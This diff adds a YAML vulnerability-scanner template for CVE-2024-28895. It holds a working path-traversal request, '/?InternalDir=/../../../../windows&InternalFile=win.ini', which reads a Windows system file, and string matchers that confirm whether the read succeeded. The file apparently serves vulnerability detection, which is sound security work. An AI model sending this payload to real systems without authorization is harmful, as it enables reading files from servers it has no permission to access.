@@ -1,0 +1,22 @@
+info:
+  - name: CVE-2024-28895
+    author: "ycx"
+    CVE: CVE-2024-28895
+
+requests:
+  - httpMethod: "GET"
+    Headers:
+      User-Agent: "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
+      Cookie: "test"
+    ReqPath: "/?InternalDir=/../../../../windows&InternalFile=win.ini"
+    timeout: 10  # 超时时间，单位为秒
+
+match:
+  - type: "String"
+    matchStrings:
+      - "for 16-bit"
+      - "目录不存在"
+    logic: "OR"
+
+attack:
+  - payload: "/?InternalDir=/../../../../windows&InternalFile=win.ini"
